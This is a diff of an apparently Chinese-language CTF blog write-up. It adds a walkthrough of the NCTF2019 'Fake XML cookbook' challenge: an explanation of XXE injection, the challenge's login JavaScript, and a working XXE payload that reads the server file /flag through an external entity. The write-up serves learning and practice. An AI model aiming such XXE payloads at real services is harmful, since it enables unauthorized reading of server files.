@@ -37,8 +37,11 @@
 <meta property="og:image" content="http://example.com/2024/02/17/WebWriteUp7/image-20240217153825412.png">
 <meta property="og:image" content="http://example.com/2024/02/17/WebWriteUp7/image-20240218213612919.png">
 <meta property="og:image" content="http://example.com/2024/02/17/WebWriteUp7/image-20240218215045034.png">
+<meta property="og:image" content="http://example.com/2024/02/17/WebWriteUp7/image-20240219193536865.png">
+<meta property="og:image" content="http://example.com/2024/02/17/WebWriteUp7/image-20240219193641508.png">
+<meta property="og:image" content="http://example.com/2024/02/17/WebWriteUp7/image-20240219201314313.png">
 <meta property="article:published_time" content="2024-02-17T06:26:44.000Z">
-<meta property="article:modified_time" content="2024-02-18T13:51:19.781Z">
+<meta property="article:modified_time" content="2024-02-19T12:18:46.157Z">
 <meta property="article:author" content="TEhS">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
@@ -235,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          3.6k 字
+          5.7k 字
         
       </span>
     
@@ -246,7 +249,7 @@
         
         
         
-          30 分钟
+          48 分钟
         
       </span>
     
@@ -349,6 +352,23 @@
 
 <p>用蚁剑连接：</p>
 <p><img src="/2024/02/17/WebWriteUp7/image-20240218215045034.png" srcset="/img/loading.gif" lazyload alt="image-20240218215045034"></p>
+<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p><img src="/2024/02/17/WebWriteUp7/image-20240219193536865.png" srcset="/img/loading.gif" lazyload alt="image-20240219193536865"></p>
+<p><img src="/2024/02/17/WebWriteUp7/image-20240219193641508.png" srcset="/img/loading.gif" lazyload alt="image-20240219193641508"></p>
+<p>以为是一道sql注入题，但好像username那儿不存在注入点，尝试命令注入，也统统被拦下来了</p>
+<blockquote>
+<p><strong>新知识点：XXE漏洞</strong>（<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6887">xml相关漏洞</a>）</p>
+<p>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。<br>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。<br>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
+</blockquote>
+<p>这里访问页面源码，在script部分找到一下内容，对于代码的解释写在注释里：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs javascript"> <span class="hljs-keyword">function</span> <span class="hljs-title function_">doLogin</span>(<span class="hljs-params"></span>)&#123;<br>	<span class="hljs-keyword">var</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();<br>	<span class="hljs-keyword">var</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();<br>	<span class="hljs-keyword">if</span>(username == <span class="hljs-string">&quot;&quot;</span> || password == <span class="hljs-string">&quot;&quot;</span>)&#123;<br>		<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Please enter the username and password!&quot;</span>);<br>		<span class="hljs-keyword">return</span>;<br>	&#125;<span class="hljs-comment">//获取用户名和密码，检查是否为空</span><br>	<br>	<span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="hljs-string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="hljs-string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; <span class="hljs-comment">//构造了一个xml实体（从这里判断可能存在xxe注入）</span><br>    $.<span class="hljs-title function_">ajax</span>(&#123;<span class="hljs-comment">//使用 jQuery 的 $.ajax 函数发起一个 POST 请求到服务器的 doLogin.php 页面</span><br>        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,<br>        <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;doLogin.php&quot;</span>,<br>        <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span>,<br>        <span class="hljs-attr">data</span>: data,<br>        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;xml&quot;</span>,<br>        <span class="hljs-attr">anysc</span>: <span class="hljs-literal">false</span>,<br>        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">result</span>) &#123;<br>        	<span class="hljs-keyword">var</span> code = result.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;code&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;<br>        	<span class="hljs-keyword">var</span> msg = result.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;msg&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;<br>        	<span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;0&quot;</span>)&#123;<br>        		$(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(msg + <span class="hljs-string">&quot; login fail!&quot;</span>);<br>        	&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;1&quot;</span>)&#123;<br>        		$(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(msg + <span class="hljs-string">&quot; login success!&quot;</span>);<br>        	&#125;<span class="hljs-keyword">else</span>&#123;<br>        		$(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(<span class="hljs-string">&quot;error:&quot;</span> + msg);<br>        	&#125;<span class="hljs-comment">//根据 code 的值进行不同的处理，更新页面上的提示信息。</span><br>        &#125;,<br>        <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;<br>            $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(errorThrown + <span class="hljs-string">&#x27;:&#x27;</span> + textStatus);<br>        &#125;<br>    &#125;); <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>从这里也能看出，并不存在sql语句之类的拼接，自然sql注入的手段全部不行</p>
+<p>抓个包，要完成flag得获取，这里就得构造恶意的xml实体</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;test;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>123<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><code>&lt;!DOCTYPE ANY [</code>：这是声明 XML 文档类型（DOCTYPE）的开始，<code>ANY</code> 是一个通配符，表示可以接受任何类型的文档类型声明。</p>
+<p><code>&lt;!ENTITY test SYSTEM &quot;file:///flag&quot;&gt;</code>：这是 XML 实体的定义，创建了一个名为 <code>test</code> 的实体，其内容从指定的系统文件中加载，这里的文件路径是 “file:&#x2F;&#x2F;&#x2F;flag”，表示加载根目录下的 “flag” 文件。</p>
+<p><img src="/2024/02/17/WebWriteUp7/image-20240219201314313.png" srcset="/img/loading.gif" lazyload alt="image-20240219201314313"></p>
 
                 
               </div>
